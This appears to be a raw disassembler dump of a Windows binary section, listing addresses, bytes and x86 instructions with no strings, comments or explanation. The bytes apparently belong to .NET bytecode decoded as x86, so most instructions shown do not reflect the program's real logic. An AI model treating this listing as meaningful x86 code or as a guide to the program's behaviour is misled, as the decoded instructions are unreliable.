  404bf7:	0a 28                	or     (%eax),%ch
  404bf9:	e1 00                	loope  0x404bfb
  404bfb:	00 0a                	add    %cl,(%edx)
  404bfd:	28 e2                	sub    %ah,%dl
  404bff:	00 00                	add    %al,(%eax)
  404c01:	0a 17                	or     (%edi),%dl
  404c03:	16                   	push   %ss
  404c04:	16                   	push   %ss
  404c05:	28 8c 00 00 06 de 03 	sub    %cl,0x3de0600(%eax,%eax,1)
  404c0c:	26 de 00             	fiadds %es:(%eax)
  404c0f:	2a 01                	sub    (%ecx),%al
  404c11:	10 00                	adc    %al,(%eax)
  404c13:	00 00                	add    %al,(%eax)
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 20                	add    %ah,(%eax)
  404c19:	20 00                	and    %al,(%eax)
  404c1b:	03 0f                	add    (%edi),%ecx
  404c1d:	00 00                	add    %al,(%eax)
  404c1f:	01 1b                	add    %ebx,(%ebx)
  404c21:	30 03                	xor    %al,(%ebx)
  404c23:	00 18                	add    %bl,(%eax)
  404c25:	00 00                	add    %al,(%eax)
  404c27:	00 00                	add    %al,(%eax)
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	00 16                	add    %dl,(%esi)
  404c2d:	16                   	push   %ss
  404c2e:	16                   	push   %ss
  404c2f:	28 8c 00 00 06 de 0d 	sub    %cl,0xdde0600(%eax,%eax,1)
  404c36:	26 20 a0 86 01 00 28 	and    %ah,%es:0x28000186(%eax)
  404c3d:	14 00                	adc    $0x0,%al
  404c3f:	00 0a                	add    %cl,(%edx)
  404c41:	2b f4                	sub    %esp,%esi
  404c43:	2a 01                	sub    (%ecx),%al
  404c45:	10 00                	adc    %al,(%eax)
  404c47:	00 00                	add    %al,(%eax)
  404c49:	00 00                	add    %al,(%eax)
  404c4b:	00 0a                	add    %cl,(%edx)
  404c4d:	0a 00                	or     (%eax),%al
  404c4f:	0d 0f 00 00 01       	or     $0x100000f,%eax
  404c54:	1b 30                	sbb    (%eax),%esi
  404c56:	04 00                	add    $0x0,%al
  404c58:	38 00                	cmp    %al,(%eax)
  404c5a:	00 00                	add    %al,(%eax)
  404c5c:	23 00                	and    (%eax),%eax
  404c5e:	00 11                	add    %dl,(%ecx)
  404c60:	7e 99                	jle    0x404bfb
  404c62:	00 00                	add    %al,(%eax)
  404c64:	0a 7e 36             	or     0x36(%esi),%bh
  404c67:	00 00                	add    %al,(%eax)
  404c69:	04 18                	add    $0x18,%al
  404c6b:	6f                   	outsl  %ds:(%esi),(%dx)
  404c6c:	e3 00                	jecxz  0x404c6e
  404c6e:	00 0a                	add    %cl,(%edx)
  404c70:	0a 06                	or     (%esi),%al
  404c72:	02 03                	add    (%ebx),%al
  404c74:	18 6f e4             	sbb    %ch,-0x1c(%edi)
  404c77:	00 00                	add    %al,(%eax)
  404c79:	0a 17                	or     (%edi),%dl
  404c7b:	0b de                	or     %esi,%ebx
  404c7d:	18 06                	sbb    %al,(%esi)
  404c7f:	2c 06                	sub    $0x6,%al
  404c81:	06                   	push   %es
  404c82:	6f                   	outsl  %ds:(%esi),(%dx)
  404c83:	33 00                	xor    (%eax),%eax
  404c85:	00 0a                	add    %cl,(%edx)
  404c87:	dc 6f e5             	fsubrl -0x1b(%edi)
  404c8a:	00 00                	add    %al,(%eax)
  404c8c:	0a 28                	or     (%eax),%ch
  404c8e:	95                   	xchg   %eax,%ebp
  404c8f:	00 00                	add    %al,(%eax)
  404c91:	06                   	push   %es
  404c92:	de 00                	fiadds (%eax)
  404c94:	16                   	push   %ss
  404c95:	2a 07                	sub    (%edi),%al
  404c97:	2a 01                	sub    (%ecx),%al
  404c99:	1c 00                	sbb    $0x0,%al
  404c9b:	00 02                	add    %al,(%edx)
  404c9d:	00 11                	add    %dl,(%ecx)
  404c9f:	00 0d 1e 00 0a 00    	add    %cl,0xa001e
  404ca5:	00 00                	add    %al,(%eax)
  404ca7:	00 00                	add    %al,(%eax)
  404ca9:	00 00                	add    %al,(%eax)
  404cab:	00 28                	add    %ch,(%eax)
  404cad:	28 00                	sub    %al,(%eax)
  404caf:	0c 11                	or     $0x11,%al
  404cb1:	00 00                	add    %al,(%eax)
  404cb3:	01 1b                	add    %ebx,(%ebx)
  404cb5:	30 02                	xor    %al,(%edx)
  404cb7:	00 39                	add    %bh,(%ecx)
  404cb9:	00 00                	add    %al,(%eax)
  404cbb:	00 24 00             	add    %ah,(%eax,%eax,1)
  404cbe:	00 11                	add    %dl,(%ecx)
  404cc0:	7e 99                	jle    0x404c5b
  404cc2:	00 00                	add    %al,(%eax)
  404cc4:	0a 7e 36             	or     0x36(%esi),%bh
  404cc7:	00 00                	add    %al,(%eax)
  404cc9:	04 6f                	add    $0x6f,%al
  404ccb:	e6 00                	out    %al,$0x0
  404ccd:	00 0a                	add    %cl,(%edx)
  404ccf:	0a 06                	or     (%esi),%al
  404cd1:	02 6f e7             	add    -0x19(%edi),%ch
  404cd4:	00 00                	add    %al,(%eax)
  404cd6:	0a 74 4c 00          	or     0x0(%esp,%ecx,2),%dh
  404cda:	00 01                	add    %al,(%ecx)
  404cdc:	0b de                	or     %esi,%ebx
  404cde:	18 06                	sbb    %al,(%esi)
  404ce0:	2c 06                	sub    $0x6,%al
  404ce2:	06                   	push   %es
  404ce3:	6f                   	outsl  %ds:(%esi),(%dx)
  404ce4:	33 00                	xor    (%eax),%eax
  404ce6:	00 0a                	add    %cl,(%edx)
  404ce8:	dc 6f e5             	fsubrl -0x1b(%edi)
  404ceb:	00 00                	add    %al,(%eax)
  404ced:	0a 28                	or     (%eax),%ch
  404cef:	95                   	xchg   %eax,%ebp
  404cf0:	00 00                	add    %al,(%eax)
  404cf2:	06                   	push   %es
  404cf3:	de 00                	fiadds (%eax)
  404cf5:	14 2a                	adc    $0x2a,%al
  404cf7:	07                   	pop    %es
  404cf8:	2a 00                	sub    (%eax),%al
  404cfa:	00 00                	add    %al,(%eax)
  404cfc:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404cff:	00 02                	add    %al,(%edx)
  404d01:	00 10                	add    %dl,(%eax)
  404d03:	00 0f                	add    %cl,(%edi)
  404d05:	1f                   	pop    %ds
  404d06:	00 0a                	add    %cl,(%edx)
	...
  404d10:	29 29                	sub    %ebp,(%ecx)
  404d12:	00 0c 11             	add    %cl,(%ecx,%edx,1)
  404d15:	00 00                	add    %al,(%eax)
  404d17:	01 1b                	add    %ebx,(%ebx)
  404d19:	30 02                	xor    %al,(%edx)
  404d1b:	00 35 00 00 00 23    	add    %dh,0x23000000
  404d21:	00 00                	add    %al,(%eax)
  404d23:	11 7e 99             	adc    %edi,-0x67(%esi)
  404d26:	00 00                	add    %al,(%eax)
  404d28:	0a 7e 36             	or     0x36(%esi),%bh
  404d2b:	00 00                	add    %al,(%eax)
  404d2d:	04 6f                	add    $0x6f,%al
  404d2f:	e6 00                	out    %al,$0x0
  404d31:	00 0a                	add    %cl,(%edx)
  404d33:	0a 06                	or     (%esi),%al
  404d35:	02 6f e8             	add    -0x18(%edi),%ch
  404d38:	00 00                	add    %al,(%eax)
  404d3a:	0a 17                	or     (%edi),%dl
  404d3c:	0b de                	or     %esi,%ebx
  404d3e:	18 06                	sbb    %al,(%esi)
  404d40:	2c 06                	sub    $0x6,%al
  404d42:	06                   	push   %es
  404d43:	6f                   	outsl  %ds:(%esi),(%dx)
  404d44:	33 00                	xor    (%eax),%eax
  404d46:	00 0a                	add    %cl,(%edx)
  404d48:	dc 6f e5             	fsubrl -0x1b(%edi)
  404d4b:	00 00                	add    %al,(%eax)
  404d4d:	0a 28                	or     (%eax),%ch
  404d4f:	95                   	xchg   %eax,%ebp
  404d50:	00 00                	add    %al,(%eax)
  404d52:	06                   	push   %es
  404d53:	de 00                	fiadds (%eax)
  404d55:	16                   	push   %ss
  404d56:	2a 07                	sub    (%edi),%al
  404d58:	2a 00                	sub    (%eax),%al
  404d5a:	00 00                	add    %al,(%eax)
  404d5c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404d5f:	00 02                	add    %al,(%edx)
  404d61:	00 10                	add    %dl,(%eax)
  404d63:	00 0b                	add    %cl,(%ebx)
  404d65:	1b 00                	sbb    (%eax),%eax
  404d67:	0a 00                	or     (%eax),%al
  404d69:	00 00                	add    %al,(%eax)
  404d6b:	00 00                	add    %al,(%eax)
  404d6d:	00 00                	add    %al,(%eax)
  404d6f:	00 25 25 00 0c 11    	add    %ah,0x110c0025
  404d75:	00 00                	add    %al,(%eax)
  404d77:	01 1b                	add    %ebx,(%ebx)
  404d79:	30 03                	xor    %al,(%ebx)
  404d7b:	00 3a                	add    %bh,(%edx)
  404d7d:	00 00                	add    %al,(%eax)
  404d7f:	00 23                	add    %ah,(%ebx)
  404d81:	00 00                	add    %al,(%eax)
  404d83:	11 7e 99             	adc    %edi,-0x67(%esi)
  404d86:	00 00                	add    %al,(%eax)
  404d88:	0a 72 01             	or     0x1(%edx),%dh
  404d8b:	01 00                	add    %eax,(%eax)
  404d8d:	70 17                	jo     0x404da6
  404d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  404d90:	e9 00 00 0a 0a       	jmp    0xa4a4d95
  404d95:	06                   	push   %es
  404d96:	7e 36                	jle    0x404dce
  404d98:	00 00                	add    %al,(%eax)
  404d9a:	04 6f                	add    $0x6f,%al
  404d9c:	ea 00 00 0a 17 0b de 	ljmp   $0xde0b,$0x170a0000
  404da3:	18 06                	sbb    %al,(%esi)
  404da5:	2c 06                	sub    $0x6,%al
  404da7:	06                   	push   %es
  404da8:	6f                   	outsl  %ds:(%esi),(%dx)
  404da9:	33 00                	xor    (%eax),%eax
  404dab:	00 0a                	add    %cl,(%edx)
  404dad:	dc 6f e5             	fsubrl -0x1b(%edi)
  404db0:	00 00                	add    %al,(%eax)
  404db2:	0a 28                	or     (%eax),%ch
  404db4:	95                   	xchg   %eax,%ebp
  404db5:	00 00                	add    %al,(%eax)
  404db7:	06                   	push   %es
  404db8:	de 00                	fiadds (%eax)
  404dba:	16                   	push   %ss
  404dbb:	2a 07                	sub    (%edi),%al
  404dbd:	2a 00                	sub    (%eax),%al
  404dbf:	00 01                	add    %al,(%ecx)
  404dc1:	1c 00                	sbb    $0x0,%al
  404dc3:	00 02                	add    %al,(%edx)
  404dc5:	00 11                	add    %dl,(%ecx)
  404dc7:	00 0f                	add    %cl,(%edi)
  404dc9:	20 00                	and    %al,(%eax)
  404dcb:	0a 00                	or     (%eax),%al
  404dcd:	00 00                	add    %al,(%eax)
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	00 00                	add    %al,(%eax)
  404dd3:	00 2a                	add    %ch,(%edx)
  404dd5:	2a 00                	sub    (%eax),%al
  404dd7:	0c 11                	or     $0x11,%al
  404dd9:	00 00                	add    %al,(%eax)
  404ddb:	01 56 72             	add    %edx,0x72(%esi)
  404dde:	a3 06 00 70 7e       	mov    %eax,0x7e700006
  404de3:	10 00                	adc    %al,(%eax)
  404de5:	00 04 28             	add    %al,(%eax,%ebp,1)
  404de8:	51                   	push   %ecx
  404de9:	00 00                	add    %al,(%eax)
  404deb:	0a 80 36 00 00 04    	or     0x4000036(%eax),%al
  404df1:	2a 00                	sub    (%eax),%al
  404df3:	00 1b                	add    %bl,(%ebx)
  404df5:	30 04 00             	xor    %al,(%eax,%eax,1)
  404df8:	c4 01                	les    (%ecx),%eax
  404dfa:	00 00                	add    %al,(%eax)
  404dfc:	25 00 00 11 73       	and    $0x73110000,%eax
  404e01:	62 00                	bound  %eax,(%eax)
  404e03:	00 06                	add    %al,(%esi)
  404e05:	0a 06                	or     (%esi),%al
  404e07:	02 74 03 00          	add    0x0(%ebx,%eax,1),%dh
  404e0b:	00 1b                	add    %bl,(%ebx)
  404e0d:	6f                   	outsl  %ds:(%esi),(%dx)
  404e0e:	54                   	push   %esp
  404e0f:	00 00                	add    %al,(%eax)
  404e11:	06                   	push   %es
  404e12:	06                   	push   %es
  404e13:	72 21                	jb     0x404e36
  404e15:	01 00                	add    %eax,(%eax)
  404e17:	70 6f                	jo     0x404e88
  404e19:	4d                   	dec    %ebp
  404e1a:	00 00                	add    %al,(%eax)
  404e1c:	06                   	push   %es
  404e1d:	6f                   	outsl  %ds:(%esi),(%dx)
  404e1e:	59                   	pop    %ecx
  404e1f:	00 00                	add    %al,(%eax)
  404e21:	06                   	push   %es
  404e22:	0b 07                	or     (%edi),%eax
  404e24:	39 8c 01 00 00 07 72 	cmp    %ecx,0x72070000(%ecx,%eax,1)
  404e2b:	b7 06                	mov    $0x6,%bh
  404e2d:	00 70 28             	add    %dh,0x28(%eax)
  404e30:	27                   	daa
  404e31:	00 00                	add    %al,(%eax)
  404e33:	0a 2d 22 07 72 c1    	or     0xc1720722,%ch
  404e39:	06                   	push   %es
  404e3a:	00 70 28             	add    %dh,0x28(%eax)
  404e3d:	27                   	daa
  404e3e:	00 00                	add    %al,(%eax)
  404e40:	0a 2d 56 07 72 cf    	or     0xcf720756,%ch
  404e46:	06                   	push   %es
  404e47:	00 70 28             	add    %dh,0x28(%eax)
  404e4a:	27                   	daa
  404e4b:	00 00                	add    %al,(%eax)
  404e4d:	0a 3a                	or     (%edx),%bh
  404e4f:	cb                   	lret
  404e50:	00 00                	add    %al,(%eax)
  404e52:	00 38                	add    %bh,(%eax)
  404e54:	5d                   	pop    %ebp
  404e55:	01 00                	add    %eax,(%eax)
  404e57:	00 28                	add    %ch,(%eax)
  404e59:	17                   	pop    %ss
  404e5a:	00 00                	add    %al,(%eax)
  404e5c:	06                   	push   %es
  404e5d:	0c 73                	or     $0x73,%al
  404e5f:	62 00                	bound  %eax,(%eax)
  404e61:	00 06                	add    %al,(%esi)
  404e63:	25 72 21 01 00       	and    $0x12172,%eax
  404e68:	70 6f                	jo     0x404ed9
  404e6a:	4d                   	dec    %ebp
  404e6b:	00 00                	add    %al,(%eax)
  404e6d:	06                   	push   %es
  404e6e:	72 b7                	jb     0x404e27
  404e70:	06                   	push   %es
  404e71:	00 70 6f             	add    %dh,0x6f(%eax)
  404e74:	4f                   	dec    %edi
  404e75:	00 00                	add    %al,(%eax)
  404e77:	06                   	push   %es
  404e78:	25 72 39 01 00       	and    $0x13972,%eax
  404e7d:	70 6f                	jo     0x404eee
  404e7f:	4d                   	dec    %ebp
  404e80:	00 00                	add    %al,(%eax)
  404e82:	06                   	push   %es
  404e83:	08 6a 6f             	or     %ch,0x6f(%edx)
  404e86:	42                   	inc    %edx
  404e87:	00 00                	add    %al,(%eax)
  404e89:	06                   	push   %es
  404e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  404e8b:	57                   	push   %edi
  404e8c:	00 00                	add    %al,(%eax)
  404e8e:	06                   	push   %es
  404e8f:	28 1e                	sub    %bl,(%esi)
  404e91:	00 00                	add    %al,(%eax)
  404e93:	06                   	push   %es
  404e94:	38 1c 01             	cmp    %bl,(%ecx,%eax,1)
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 06                	add    %al,(%esi)
  404e9b:	28 93 00 00 06 dd    	sub    %dl,-0x22fa0000(%ebx)
  404ea1:	10 01                	adc    %al,(%ecx)
  404ea3:	00 00                	add    %al,(%eax)
  404ea5:	0d 06 72 e5 06       	or     $0x6e57206,%eax
  404eaa:	00 70 6f             	add    %dh,0x6f(%eax)
  404ead:	4d                   	dec    %ebp
  404eae:	00 00                	add    %al,(%eax)
  404eb0:	06                   	push   %es
  404eb1:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb2:	59                   	pop    %ecx
  404eb3:	00 00                	add    %al,(%eax)
  404eb5:	06                   	push   %es
  404eb6:	28 8e 00 00 06 2d    	sub    %cl,0x2d060000(%esi)
  404ebc:	51                   	push   %ecx
  404ebd:	7e 37                	jle    0x404ef6
  404ebf:	00 00                	add    %al,(%eax)
  404ec1:	04 06                	add    $0x6,%al
  404ec3:	6f                   	outsl  %ds:(%esi),(%dx)
  404ec4:	5d                   	pop    %ebp
  404ec5:	00 00                	add    %al,(%eax)
  404ec7:	0a 73 62             	or     0x62(%ebx),%dh
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	06                   	push   %es
  404ecd:	25 72 21 01 00       	and    $0x12172,%eax
  404ed2:	70 6f                	jo     0x404f43
  404ed4:	4d                   	dec    %ebp
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	06                   	push   %es
  404ed8:	72 ed                	jb     0x404ec7
  404eda:	06                   	push   %es
  404edb:	00 70 6f             	add    %dh,0x6f(%eax)
  404ede:	4f                   	dec    %edi
  404edf:	00 00                	add    %al,(%eax)
  404ee1:	06                   	push   %es
  404ee2:	25 72 03 07 00       	and    $0x70372,%eax
  404ee7:	70 6f                	jo     0x404f58
  404ee9:	4d                   	dec    %ebp
  404eea:	00 00                	add    %al,(%eax)
  404eec:	06                   	push   %es
  404eed:	06                   	push   %es
  404eee:	72 e5                	jb     0x404ed5
  404ef0:	06                   	push   %es
  404ef1:	00 70 6f             	add    %dh,0x6f(%eax)
  404ef4:	4d                   	dec    %ebp
  404ef5:	00 00                	add    %al,(%eax)
  404ef7:	06                   	push   %es
  404ef8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ef9:	59                   	pop    %ecx
  404efa:	00 00                	add    %al,(%eax)
  404efc:	06                   	push   %es
  404efd:	6f                   	outsl  %ds:(%esi),(%dx)
  404efe:	4f                   	dec    %edi
  404eff:	00 00                	add    %al,(%eax)
  404f01:	06                   	push   %es
  404f02:	6f                   	outsl  %ds:(%esi),(%dx)
  404f03:	57                   	push   %edi
  404f04:	00 00                	add    %al,(%eax)
  404f06:	06                   	push   %es
  404f07:	28 1e                	sub    %bl,(%esi)
  404f09:	00 00                	add    %al,(%eax)
  404f0b:	06                   	push   %es
  404f0c:	2b 0b                	sub    (%ebx),%ecx
  404f0e:	09 6f e5             	or     %ebp,-0x1b(%edi)
  404f11:	00 00                	add    %al,(%eax)
  404f13:	0a 28                	or     (%eax),%ch
  404f15:	95                   	xchg   %eax,%ebp
  404f16:	00 00                	add    %al,(%eax)
  404f18:	06                   	push   %es
  404f19:	dd 97 00 00 00 06    	fstl   0x6000000(%edi)
  404f1f:	72 11                	jb     0x404f32
  404f21:	07                   	pop    %es
  404f22:	00 70 6f             	add    %dh,0x6f(%eax)
  404f25:	4d                   	dec    %ebp
  404f26:	00 00                	add    %al,(%eax)
  404f28:	06                   	push   %es
  404f29:	6f                   	outsl  %ds:(%esi),(%dx)
  404f2a:	59                   	pop    %ecx
  404f2b:	00 00                	add    %al,(%eax)
  404f2d:	06                   	push   %es
  404f2e:	06                   	push   %es
  404f2f:	72 e5                	jb     0x404f16
  404f31:	06                   	push   %es
  404f32:	00 70 6f             	add    %dh,0x6f(%eax)
  404f35:	4d                   	dec    %ebp
  404f36:	00 00                	add    %al,(%eax)
  404f38:	06                   	push   %es
  404f39:	6f                   	outsl  %ds:(%esi),(%dx)
  404f3a:	59                   	pop    %ecx
  404f3b:	00 00                	add    %al,(%eax)
  404f3d:	06                   	push   %es
  404f3e:	28 8d 00 00 06 26    	sub    %cl,0x26060000(%ebp)
  404f44:	7e 37                	jle    0x404f7d
  404f46:	00 00                	add    %al,(%eax)
  404f48:	04 28                	add    $0x28,%al
  404f4a:	03 00                	add    (%eax),%eax
  404f4c:	00 2b                	add    %ch,(%ebx)
  404f4e:	6f                   	outsl  %ds:(%esi),(%dx)
  404f4f:	5e                   	pop    %esi
  404f50:	00 00                	add    %al,(%eax)
  404f52:	0a 13                	or     (%ebx),%dl
  404f54:	04 2b                	add    $0x2b,%al
  404f56:	45                   	inc    %ebp
  404f57:	12 04 28             	adc    (%eax,%ebp,1),%al
  404f5a:	5f                   	pop    %edi
  404f5b:	00 00                	add    %al,(%eax)
  404f5d:	0a 13                	or     (%ebx),%dl
  404f5f:	05 11 05 72 e5       	add    $0xe5720511,%eax
  404f64:	06                   	push   %es
  404f65:	00 70 6f             	add    %dh,0x6f(%eax)
  404f68:	4d                   	dec    %ebp
  404f69:	00 00                	add    %al,(%eax)
  404f6b:	06                   	push   %es
  404f6c:	6f                   	outsl  %ds:(%esi),(%dx)
  404f6d:	59                   	pop    %ecx
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	06                   	push   %es
  404f72:	72 11                	jb     0x404f85
  404f74:	07                   	pop    %es
  404f75:	00 70 6f             	add    %dh,0x6f(%eax)
  404f78:	4d                   	dec    %ebp
  404f79:	00 00                	add    %al,(%eax)
  404f7b:	06                   	push   %es
  404f7c:	6f                   	outsl  %ds:(%esi),(%dx)
  404f7d:	59                   	pop    %ecx
  404f7e:	00 00                	add    %al,(%eax)
  404f80:	06                   	push   %es
  404f81:	28 27                	sub    %ah,(%edi)
  404f83:	00 00                	add    %al,(%eax)
  404f85:	0a 2c 14             	or     (%esp,%edx,1),%ch
  404f88:	11 05 28 93 00 00    	adc    %eax,0x9328
  404f8e:	06                   	push   %es
  404f8f:	7e 37                	jle    0x404fc8
  404f91:	00 00                	add    %al,(%eax)
  404f93:	04 11                	add    $0x11,%al
  404f95:	05 6f ec 00 00       	add    $0xec6f,%eax
  404f9a:	0a 26                	or     (%esi),%ah
  404f9c:	12 04 28             	adc    (%eax,%ebp,1),%al
  404f9f:	61                   	popa
  404fa0:	00 00                	add    %al,(%eax)
  404fa2:	0a 2d b2 de 0e 12    	or     0x120edeb2,%ch
  404fa8:	04 fe                	add    $0xfe,%al
  404faa:	16                   	push   %ss
  404fab:	02 00                	add    (%eax),%al
  404fad:	00 1b                	add    %bl,(%ebx)
  404faf:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb0:	33 00                	xor    (%eax),%eax
  404fb2:	00 0a                	add    %cl,(%edx)
  404fb4:	dc de                	(bad)
  404fb6:	0c 6f                	or     $0x6f,%al
  404fb8:	e5 00                	in     $0x0,%eax
  404fba:	00 0a                	add    %cl,(%edx)
  404fbc:	28 95 00 00 06 de    	sub    %dl,-0x21fa0000(%ebp)
  404fc2:	00 2a                	add    %ch,(%edx)
  404fc4:	41                   	inc    %ecx
  404fc5:	4c                   	dec    %esp
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	00 00                	add    %al,(%eax)
  404fca:	00 00                	add    %al,(%eax)
  404fcc:	9a 00 00 00 0b 00 00 	lcall  $0x0,$0xb000000
  404fd3:	00 a5 00 00 00 79    	add    %ah,0x79000000(%ebp)
  404fd9:	00 00                	add    %al,(%eax)
  404fdb:	00 11                	add    %dl,(%ecx)
  404fdd:	00 00                	add    %al,(%eax)
  404fdf:	01 02                	add    %eax,(%edx)
  404fe1:	00 00                	add    %al,(%eax)
  404fe3:	00 55 01             	add    %dl,0x1(%ebp)
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	52                   	push   %edx
  404fe9:	00 00                	add    %al,(%eax)
  404feb:	00 a7 01 00 00 0e    	add    %ah,0xe000001(%edi)
	...
  404ffd:	00 00                	add    %al,(%eax)
  404fff:	00 b7 01 00 00 b7    	add    %dh,-0x48ffffff(%edi)
  405005:	01 00                	add    %eax,(%eax)
  405007:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40500a:	00 00                	add    %al,(%eax)
  40500c:	11 00                	adc    %eax,(%eax)
  40500e:	00 01                	add    %al,(%ecx)
  405010:	13 30                	adc    (%eax),%esi
  405012:	0b 00                	or     (%eax),%eax
  405014:	1b 01                	sbb    (%ecx),%eax
  405016:	00 00                	add    %al,(%eax)
  405018:	26 00 00             	add    %al,%es:(%eax)
  40501b:	11 28                	adc    %ebp,(%eax)
  40501d:	ed                   	in     (%dx),%eax
  40501e:	00 00                	add    %al,(%eax)
  405020:	0a 02                	or     (%edx),%al
  405022:	72 e5                	jb     0x405009
  405024:	06                   	push   %es
  405025:	00 70 6f             	add    %dh,0x6f(%eax)
  405028:	4d                   	dec    %ebp
  405029:	00 00                	add    %al,(%eax)
  40502b:	06                   	push   %es
  40502c:	6f                   	outsl  %ds:(%esi),(%dx)
  40502d:	59                   	pop    %ecx
  40502e:	00 00                	add    %al,(%eax)
  405030:	06                   	push   %es
  405031:	28 8e 00 00 06 28    	sub    %cl,0x28060000(%esi)
  405037:	9a 00 00 0a 28 1c 00 	lcall  $0x1c,$0x280a0000
  40503e:	00 0a                	add    %cl,(%edx)
  405040:	28 a0 00 00 06 6f    	sub    %ah,0x6f060000(%eax)
  405046:	ee                   	out    %al,(%dx)
  405047:	00 00                	add    %al,(%eax)
  405049:	0a 72 1b             	or     0x1b(%edx),%dh
  40504c:	07                   	pop    %es
  40504d:	00 70 6f             	add    %dh,0x6f(%eax)
  405050:	ef                   	out    %eax,(%dx)
  405051:	00 00                	add    %al,(%eax)
  405053:	0a 28                	or     (%eax),%ch
  405055:	f0 00 00             	lock add %al,(%eax)
  405058:	0a 0a                	or     (%edx),%cl
  40505a:	7e 45                	jle    0x4050a1
  40505c:	00 00                	add    %al,(%eax)
  40505e:	04 3a                	add    $0x3a,%al
  405060:	85 00                	test   %eax,(%eax)
  405062:	00 00                	add    %al,(%eax)
  405064:	20 00                	and    %al,(%eax)
  405066:	01 00                	add    %eax,(%eax)
  405068:	00 72 37             	add    %dh,0x37(%edx)
  40506b:	07                   	pop    %es
  40506c:	00 70 14             	add    %dh,0x14(%eax)
  40506f:	d0 15 00 00 02 28    	rclb   $1,0x28020000
  405075:	f1                   	int1
  405076:	00 00                	add    %al,(%eax)
  405078:	0a 1f                	or     (%edi),%bl
  40507a:	09 8d 8c 00 00 01    	or     %ecx,0x100008c(%ebp)
  405080:	25 16 16 14 28       	and    $0x28141616,%eax
  405085:	f2 00 00             	repnz add %al,(%eax)
  405088:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  40508e:	28 f2                	sub    %dh,%dl
  405090:	00 00                	add    %al,(%eax)
  405092:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  405098:	28 f2                	sub    %dh,%dl
  40509a:	00 00                	add    %al,(%eax)
  40509c:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  4050a2:	28 f2                	sub    %dh,%dl
  4050a4:	00 00                	add    %al,(%eax)
  4050a6:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  4050ac:	28 f2                	sub    %dh,%dl
  4050ae:	00 00                	add    %al,(%eax)
  4050b0:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  4050b6:	28 f2                	sub    %dh,%dl
  4050b8:	00 00                	add    %al,(%eax)
  4050ba:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  4050c0:	28 f2                	sub    %dh,%dl
  4050c2:	00 00                	add    %al,(%eax)
  4050c4:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  4050ca:	28 f2                	sub    %dh,%dl
  4050cc:	00 00                	add    %al,(%eax)
  4050ce:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  4050d4:	28 f2                	sub    %dh,%dl
  4050d6:	00 00                	add    %al,(%eax)
  4050d8:	0a a2 28 f3 00 00    	or     0xf328(%edx),%ah
  4050de:	0a 28                	or     (%eax),%ch
  4050e0:	f4                   	hlt
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	0a 80 45 00 00 04    	or     0x4000045(%eax),%al
  4050e9:	7e 45                	jle    0x405130
  4050eb:	00 00                	add    %al,(%eax)
  4050ed:	04 7b                	add    $0x7b,%al
  4050ef:	f5                   	cmc
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	0a 7e 45             	or     0x45(%esi),%bh
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	04 06                	add    $0x6,%al
  4050f9:	28 06                	sub    %al,(%esi)
  4050fb:	00 00                	add    %al,(%eax)
  4050fd:	06                   	push   %es
  4050fe:	7e 0b                	jle    0x40510b
  405100:	00 00                	add    %al,(%eax)
  405102:	04 7e                	add    $0x7e,%al
  405104:	10 00                	adc    %al,(%eax)
  405106:	00 04 02             	add    %al,(%edx,%eax,1)
  405109:	72 3f                	jb     0x40514a
  40510b:	07                   	pop    %es
  40510c:	00 70 6f             	add    %dh,0x6f(%eax)
  40510f:	4d                   	dec    %ebp
  405110:	00 00                	add    %al,(%eax)
  405112:	06                   	push   %es
  405113:	6f                   	outsl  %ds:(%esi),(%dx)
  405114:	48                   	dec    %eax
  405115:	00 00                	add    %al,(%eax)
  405117:	06                   	push   %es
  405118:	7e 35                	jle    0x40514f
  40511a:	00 00                	add    %al,(%eax)
  40511c:	04 7e                	add    $0x7e,%al
  40511e:	08 00                	or     %al,(%eax)
  405120:	00 04 7e             	add    %al,(%esi,%edi,2)
  405123:	0f 00 00             	sldt   (%eax)
  405126:	04 7e                	add    $0x7e,%al
  405128:	04 00                	add    $0x0,%al
  40512a:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40512d:	f6 00 00             	testb  $0x0,(%eax)
  405130:	0a 28                	or     (%eax),%ch
  405132:	94                   	xchg   %eax,%esp
  405133:	00 00                	add    %al,(%eax)
  405135:	06                   	push   %es
  405136:	2a be 73 62 00 00    	sub    0x6273(%esi),%bh
  40513c:	06                   	push   %es
  40513d:	25 72 21 01 00       	and    $0x12172,%eax
  405142:	70 6f                	jo     0x4051b3
  405144:	4d                   	dec    %ebp
  405145:	00 00                	add    %al,(%eax)
  405147:	06                   	push   %es
  405148:	72 4f                	jb     0x405199
  40514a:	07                   	pop    %es
  40514b:	00 70 6f             	add    %dh,0x6f(%eax)
  40514e:	5a                   	pop    %edx
  40514f:	00 00                	add    %al,(%eax)
  405151:	06                   	push   %es
  405152:	6f                   	outsl  %ds:(%esi),(%dx)
  405153:	57                   	push   %edi
  405154:	00 00                	add    %al,(%eax)
  405156:	06                   	push   %es
  405157:	28 1e                	sub    %bl,(%esi)
  405159:	00 00                	add    %al,(%eax)
  40515b:	06                   	push   %es
  40515c:	20 e8                	and    %ch,%al
  40515e:	03 00                	add    (%eax),%eax
